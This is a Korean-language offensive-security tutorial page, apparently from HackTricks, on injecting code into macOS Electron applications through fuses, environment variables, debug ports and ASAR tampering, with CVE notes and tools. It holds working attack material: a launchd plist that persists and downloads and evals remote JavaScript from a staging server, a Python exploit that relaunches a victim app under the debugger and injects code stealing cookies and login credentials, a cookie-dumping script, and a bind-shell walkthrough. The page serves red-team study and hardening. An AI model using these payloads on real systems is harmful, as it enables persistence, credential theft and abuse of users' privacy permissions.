# macOS Electron Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## 기본 정보

Electron이 무엇인지 모른다면 [**여기에서 많은 정보를 확인할 수 있습니다**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). 하지만 지금은 Electron이 **node**를 실행한다는 것만 알아두세요.\
그리고 node에는 지정된 파일 외에 다른 **code를 실행하도록 만들 수 있는 일부 **parameters** 및 **env variables**가 있습니다.

### Electron Fuses

이러한 기법은 다음에서 설명하지만, 최근 Electron에는 이를 **방지하기 위한 여러 security flags**가 추가되었습니다. 이것이 [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses)이며, macOS의 **Electron apps**가 **arbitrary code를 로드하는 것을 방지하기 위해 사용되는 항목**은 다음과 같습니다:<sup>[[1]](#references)</sup>

- **`RunAsNode`**: 비활성화하면 env var **`ELECTRON_RUN_AS_NODE`**를 사용한 code injection을 방지합니다.
- **`EnableNodeCliInspectArguments`**: 비활성화하면 `--inspect`, `--inspect-brk`와 같은 params가 적용되지 않습니다. 이러한 방식의 code injection을 방지합니다.
- **`EnableEmbeddedAsarIntegrityValidation`**: 활성화하면 로드된 **`asar`** **file**이 macOS에 의해 **검증됩니다**. 이 **file**의 내용을 수정하여 발생하는 **code injection**을 **방지합니다**.
- **`OnlyLoadAppFromAsar`**: 활성화하면 다음 순서로 로드할 대상을 검색하는 대신: **`app.asar`**, **`app`**, 마지막으로 **`default_app.asar`**. `app.asar`만 확인하고 사용합니다. 따라서 **`embeddedAsarIntegrityValidation`** fuse와 **결합하면** **검증되지 않은 code를 로드하는 것이 불가능해집니다**.
- **`LoadBrowserProcessSpecificV8Snapshot`**: 활성화하면 browser process는 V8 snapshot으로 `browser_v8_context_snapshot.bin`이라는 file을 사용합니다.

code injection을 방지하지 않는 또 다른 흥미로운 fuse는 다음과 같습니다.

- **EnableCookieEncryption**: 활성화하면 disk의 cookie store가 OS level cryptography keys를 사용하여 암호화됩니다.

### Electron Fuses 확인

다음 명령을 사용하여 application에서 이러한 **flags**를 **확인할 수 있습니다**:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Electron Fuses 수정

[**문서에서 설명하듯이**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), **Electron Fuses**의 configuration은 **Electron binary** 내부에 설정되며, 해당 binary에는 문자열 **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**가 포함되어 있습니다.<sup>[[1]](#references)</sup>

macOS 애플리케이션에서는 일반적으로 다음 위치에 있습니다: `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
이 파일을 [https://hexed.it/](https://hexed.it/)에서 열고 이전 문자열을 검색할 수 있습니다. 이 문자열 뒤에는 각 fuse가 disabled인지 enabled인지 나타내는 ASCII 숫자 `"0"` 또는 `"1"`이 표시됩니다. hex code를 수정하여 (`0x30`은 `0`이고 `0x31`은 `1`) **fuse values를 수정**하면 됩니다.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

수정된 bytes로 애플리케이션 내부의 **`Electron Framework` binary**를 **overwrite**하려고 하면 앱이 실행되지 않는다는 점에 유의하세요.

## RCE: Electron Applications에 code 추가

Electron App이 사용하는 **external JS/HTML files**이 있을 수 있으므로, 공격자는 signature가 확인되지 않는 이러한 파일에 code를 inject하고 앱의 context에서 arbitrary code를 실행할 수 있습니다.

> [!CAUTION]
> 하지만 현재는 2가지 limitation이 있습니다:
>
> - App을 modify하려면 **`kTCCServiceSystemPolicyAppBundles`** permission이 **필요**하므로, 기본적으로 더 이상 이 작업을 수행할 수 없습니다.
> - 컴파일된 **`asap`** file에는 일반적으로 **`embeddedAsarIntegrityValidation`** 및 **`onlyLoadAppFromAsar`** fuses가 **enabled** 상태입니다.
>
> 따라서 이 attack path가 더 복잡해지거나 (또는 불가능해집니다).

애플리케이션을 다른 directory(예: **`/tmp`**)로 copy하고, **`app.app/Contents`** folder의 이름을 **`app.app/NotCon`**으로 rename한 다음, **malicious** code로 **asar** file을 **modify**하고, 다시 **`app.app/Contents`**로 rename한 뒤 실행하면 **`kTCCServiceSystemPolicyAppBundles`** requirement를 bypass할 수 있습니다.<sup>[[5]](#references)</sup>

다음 명령으로 asar file에서 code를 unpack할 수 있습니다:
```bash
npx asar extract app.asar app-decomp
```
그리고 다음을 사용해 수정한 후 다시 패키징합니다:
```bash
npx asar pack app-decomp app-new.asar
```
## ELECTRON_RUN_AS_NODE를 사용한 RCE

[**문서**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)에 따르면, 이 환경 변수가 설정되면 프로세스가 일반 Node.js 프로세스로 시작됩니다.<sup>[[6]](#references)</sup>
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> **`RunAsNode`** fuse가 비활성화되어 있으면 env var **`ELECTRON_RUN_AS_NODE`**가 무시되므로 작동하지 않습니다.

### App Plist에서의 Injection

[**여기에서 제안된 것처럼**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), 이 env variable을 plist에서 abuse하여 persistence를 유지할 수 있습니다:<sup>[[2]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## `NODE_OPTIONS`를 사용한 RCE

payload를 다른 파일에 저장한 후 실행할 수 있습니다:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> fuse **`EnableNodeOptionsEnvironmentVariable`**가 **비활성화**된 경우, 앱이 시작될 때 환경 변수 **NODE_OPTIONS**를 무시합니다. 단, 환경 변수 **`ELECTRON_RUN_AS_NODE`**가 설정되어 있으면 예외입니다. 이 환경 변수 역시 fuse **`RunAsNode`**가 비활성화되어 있으면 무시됩니다.
>
> **`ELECTRON_RUN_AS_NODE`**를 설정하지 않으면 다음 **오류**가 표시됩니다: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### 앱 Plist에서의 Injection

이 환경 변수를 plist에서 악용하여 다음 키를 추가하면 persistence를 유지할 수 있습니다:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## inspect를 통한 RCE

[**이 글**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)에 따르면, **`--inspect`**, **`--inspect-brk`**, **`--remote-debugging-port`**와 같은 flags를 사용해 Electron application을 실행하면 **debug port가 open**되므로 해당 포트에 연결할 수 있으며(예: Chrome의 `chrome://inspect`에서), 해당 애플리케이션에 **code를 inject**하거나 새로운 process를 실행할 수도 있습니다.<sup>[[7]](#references)</sup>\
예:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
[**이 블로그 게시물**](https://hackerone.com/reports/1274695)에서는 이 debugging을 악용하여 headless chrome이 **임의의 파일을 임의의 위치에 다운로드하도록** 만들 수 있습니다.<sup>[[8]](#references)</sup>

> [!TIP]
> 앱에 환경 변수나 `--inspect`와 같은 params가 설정되었는지 확인하는 고유한 방법이 있다면, `--inspect-brk` 인자를 사용하여 runtime에서 이를 **bypass**해 볼 수 있습니다. 이 인자는 앱 실행 초기에 **execution을 중지**한 다음 bypass를 실행합니다(예를 들어 현재 process의 args 또는 env variables를 덮어씀).

다음은 `--inspect-brk` param으로 앱을 monitoring하고 executing하면 앱에 적용된 custom protection을 bypass한 다음(process의 params를 덮어써 `--inspect-brk`를 제거) JS payload를 주입하여 앱에서 cookies와 credentials를 dump할 수 있었던 exploit입니다:
```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

fs.writeFile(filePath, data, (err) => {
if (err) {
console.error(`Error writing to file ${filePath}:`, err);
} else {
console.log(`File written successfully at ${filePath}`);
}
});
}

function get_cookies() {
intervalIdCookies = setInterval(() => {
console.log("Checking cookies...");
wc.session.cookies.get({})
.then((cookies) => {
tokenCookie = cookies.find(cookie => cookie.name === "token");
if (tokenCookie){
writeToFile("/tmp/cookies.txt", cookies);
clearInterval(intervalIdCookies);
wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
}
})
}, 1000);
}

function get_creds() {
in_location = false;
intervalIdCreds = setInterval(() => {
if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
in_location = true;
console.log("Injecting creds logger...");
wc.executeJavaScript(`
(function() {
email = document.getElementById('login_email_id');
password = document.getElementById('login_password_id');
if (password && email) {
return email.value+":"+password.value;
}
})();
`).then(result => {
writeToFile("/tmp/victim_credentials.txt", result);
})
}
else if (in_location) {
wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
clearInterval(intervalIdCreds);
}
}, 10); // Check every 10ms
setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
"""
Fetch the local inspector's WebSocket URL from the JSON endpoint.
Assumes there's exactly one debug target.
"""
global INSPECT_URL

url = "http://127.0.0.1:9229/json"
response = requests.get(url)
data = response.json()
if not data:
raise RuntimeError("No debug targets found on port 9229.")
# data[0] should contain an object with "webSocketDebuggerUrl"
ws_url = data[0].get("webSocketDebuggerUrl")
if not ws_url:
raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
INSPECT_URL = ws_url


async def monitor_victim():
print("Monitoring victim process...")
found = False
while not found:
sleep(1)  # Check every second
for process in psutil.process_iter(attrs=['pid', 'name']):
try:
# Check if the process name contains "victim"
if process.info['name'] and 'victim' in process.info['name']:
found = True
print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
os.kill(process.info['pid'], 9)  # Force kill the process
except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
# Handle processes that might have terminated or are inaccessible
pass
os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
global CONTEXT_ID, NAME, UNIQUE_ID
print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]

sleep(1)

await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

await send_cmd(ws, "Profiler.enable")

await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
print("Injected code to bypass protections")


async def js_payloads():
global CONT, CONTEXT_ID, NAME, UNIQUE_ID

print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]
await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
await monitor_victim()
sleep(3)
await get_debugger_url()
await bypass_protections()

sleep(7)

await js_payloads()



async def send_cmd(ws, method, get_first=False, params={}):
"""
Send a command to the inspector and read until we get a response with matching "id".
"""
global CONT

CONT += 1

# Send the command
await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
sleep(0.4)

# Read messages until we get our command result
while True:
response = await ws.recv()
data = json.loads(response)

# Print for debugging
print(f"[{method} / {CONT}] ->", data)

if get_first:
return data

# If this message is a response to our command (by matching "id"), break
if data.get("id") == CONT:
return data

# Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
asyncio.run(main())
```
> [!CAUTION]
> Fuse **`EnableNodeCliInspectArguments`**가 비활성화되어 있으면, 앱이 실행될 때 환경 변수 **`ELECTRON_RUN_AS_NODE`**가 설정되어 있지 않은 한 **`--inspect`**와 같은 node parameters를 **무시**합니다. 또한 fuse **`RunAsNode`**가 비활성화되어 있으면 해당 환경 변수도 **무시**됩니다.
>
> 하지만 여전히 **electron parameter `--remote-debugging-port=9229`**를 사용할 수 있습니다. 다만 이전 payload는 다른 프로세스를 실행하는 데 작동하지 않습니다.

**`--remote-debugging-port=9222`** parameter를 사용하면 Electron App에서 **history**(GET commands 사용)나 browser의 **cookies**와 같은 일부 정보를 탈취할 수 있습니다. cookies는 browser 내부에서 **decrypted**되며, 이를 제공하는 **json endpoint**가 존재하기 때문입니다.

이를 수행하는 방법은 [**여기**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)와 [**여기**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)에서 확인할 수 있습니다. 또한 자동화된 tool [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) 또는 다음과 같은 간단한 script를 사용할 수 있습니다:<sup>[[9]](#references)[[10]](#references)</sup>
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
### App Plist에서의 Injection

plist에서 이 env variable을 악용하여 다음 key를 추가하면 persistence를 유지할 수 있습니다:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC Bypass abusing Older Versions

> [!TIP]
> macOS의 TCC daemon은 application의 실행된 version을 확인하지 않습니다. 따라서 이전 기법 중 어떤 방법으로도 **Electron application에 code를 inject할 수 없다면**, 이전 version의 APP을 download한 후 해당 APP에 code를 inject할 수 있습니다. Trust Cache가 이를 방지하지 않는 한 여전히 TCC privileges를 얻게 됩니다.

## Run non JS Code

앞선 기법을 사용하면 **Electron application의 process 내부에서 JS code를 실행할 수 있습니다**. 그러나 **child processes는 parent application과 동일한 sandbox profile에서 실행되며** parent application의 TCC permissions를 **상속한다는 점을** 기억해야 합니다.\
따라서 camera 또는 microphone에 access하기 위해 entitlements를 abuse하려는 경우, **process에서 다른 binary를 실행하기만 하면 됩니다**.

## Notable Electron macOS Vulnerabilities (2023-2024)

### CVE-2023-44402 – ASAR integrity bypass

Electron ≤22.3.23 및 다양한 23-27 pre-release에서는 `.app/Contents/Resources` folder에 write access가 있는 attacker가 `embeddedAsarIntegrityValidation` **및** `onlyLoadAppFromAsar` fuses를 bypass할 수 있었습니다. 이 bug는 integrity checker의 *file-type confusion*으로 인해 발생했으며, 검증된 archive 대신 **`app.asar`라는 이름의 조작된 directory**를 load할 수 있게 했습니다. 따라서 해당 directory 내부에 배치된 모든 JavaScript는 app 시작 시 실행되었습니다. 따라서 hardening guidance를 따르고 두 fuse를 모두 enable한 vendor도 macOS에서 여전히 vulnerable했습니다.<sup>[[3]](#references)</sup>

Patched Electron versions: **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** 및 **27.0.0-alpha.7**. 오래된 build를 실행 중인 application을 발견한 attacker는 `Contents/Resources/app.asar`를 자신의 directory로 overwrite하여 application의 TCC entitlements로 code를 실행할 수 있습니다.<sup>[[3]](#references)</sup>

### 2024 “RunAsNode” / “enableNodeCliInspectArguments” CVE cluster

2024년 1월, 일련의 CVE(CVE-2024-23738부터 CVE-2024-23743까지)는 많은 Electron apps가 **RunAsNode** 및 **EnableNodeCliInspectArguments** fuses를 여전히 enable한 상태로 ship된다는 점을 부각했습니다. 따라서 local attacker는 environment variable `ELECTRON_RUN_AS_NODE=1` 또는 `--inspect-brk`와 같은 flags를 사용해 program을 relaunch하여 이를 *generic* Node.js process로 전환하고 application의 sandbox 및 TCC permissions를 모두 상속할 수 있습니다.<sup>[[4]](#references)</sup>

Electron team은 “critical” rating에 이의를 제기했으며 attacker에게 이미 local code execution이 필요하다고 지적했지만, 이 issue는 post-exploitation 중 여전히 유용합니다. 이는 vulnerable Electron bundle을 *living-off-the-land* binary로 전환하여 desktop app에 이전에 granted된 Contacts, Photos 또는 기타 sensitive resources를 read할 수 있게 합니다.<sup>[[4]](#references)</sup>

Electron maintainers의 defensive guidance:<sup>[[4]](#references)</sup>

* Production builds에서 `RunAsNode` 및 `EnableNodeCliInspectArguments` fuses를 Disable합니다.
* 해당 fuses를 다시 enable하는 대신 application에 helper Node.js process가 합법적으로 필요한 경우 더 새로운 **UtilityProcess** API를 사용합니다.

## Automatic Injection

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

[**electroniz3r**](https://github.com/r3ggi/electroniz3r) tool은 설치된 **vulnerable electron applications를 쉽게 find하고** 해당 application에 code를 inject하는 데 사용할 수 있습니다. 이 tool은 다음 **`--inspect`** technique을 사용하려고 합니다:<sup>[[5]](#references)</sup>

직접 compile해야 하며 다음과 같이 사용할 수 있습니다:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Loki는 애플리케이션의 JavaScript 파일을 Loki Command & Control JavaScript 파일로 교체하여 Electron applications를 backdoor하기 위해 설계되었습니다.

## References

- [1] [Electron Fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [2] [Third-Party Frameworks를 통한 MacOS Injection - TrustedSec](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [3] [filetype confusion을 통한 ASAR Integrity 우회 (GHSA-7m48-wc93-9g85)](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [4] ['runAsNode' CVEs 관련 성명 - Electron](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [5] [DEF CON 31 - ELECTRONizing macOS Privacy - Red Teaming 무기고의 새로운 무기 - Wojciech Reguła](https://m.youtube.com/watch?v=VWQY5R2A6X8)
- [6] [Environment Variables | Electron](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)
- [7] [Electron apps가 secrets를 confidential하게 저장할 수 없는 이유: --inspect option](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
- [8] [HackerOne Report #1274695 - Electron debugging을 악용하여 arbitrary files 다운로드](https://hackerone.com/reports/1274695)
- [9] [Hands in the Cookie Jar: Chromium's Remote Debugger Port를 사용한 Cookies Dumping - SpecterOps](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [10] [Chromium's Remote Debugger를 사용한 Cookie Dumping 실패 디버깅 - slyd0g](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)
{{#include ../../../banners/hacktricks-training.md}}
